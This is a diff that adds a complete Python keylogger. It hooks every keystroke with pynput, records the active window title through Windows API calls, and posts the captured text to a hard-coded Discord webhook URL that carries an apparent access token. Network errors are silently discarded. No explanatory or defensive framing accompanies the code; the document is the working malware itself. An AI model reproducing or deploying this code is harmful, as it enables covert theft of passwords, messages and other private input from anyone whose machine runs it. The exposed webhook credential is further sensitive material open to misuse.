@@ -1,0 +1,50 @@
+# -*- coding: utf-8 -*-
+
+import os, sys, time, threading
+from pynput import keyboard  # pip install pynput
+import requests, ctypes
+
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1441495159597432917/ZsH9_eussRS6Fwkk0wX9-Lqnh_tw9YyDlW6WeDluXGA2IGt3Lc91JLZLB-Z7abpQPByX"
+
+def get_active_window_title():
+    user32 = ctypes.windll.user32
+    handle = user32.GetForegroundWindow()
+    buf= ctypes.create_unicode_buffer(512)
+    user32.GetWindowTextW(handle,buf,512)
+    return buf.value
+
+
+class KeyLogger:
+    def __init__(self):
+        self.log=""
+        self.last_window=None
+        self.lock=threading.Lock()
+
+    def on_press(self,key):
+        try: char = key.char
+        except AttributeError: char = '['+str(key)+']'
+        with self.lock:
+            self.log+=char
+            if len(self.log)>=12 or time.time()%4==0:
+                self.send_log()
+
+    def send_log(self):
+        window_title=get_active_window_title()
+        payload={
+            "content": f"🔑 {window_title}\n```{self.log}```"
+        }
+        try: requests.post(DISCORD_WEBHOOK,json=payload,timeout=10)
+        except Exception as e: pass
+        self.log=""
+
+def main():
+    logger=KeyLogger()
+    listener=keyboard.Listener(on_press=logger.on_press)
+    listener.start()
+    try:
+        while True: time.sleep(0.1)
+    except KeyboardInterrupt:
+        pass
+
+if __name__=="__main__":
+    main()
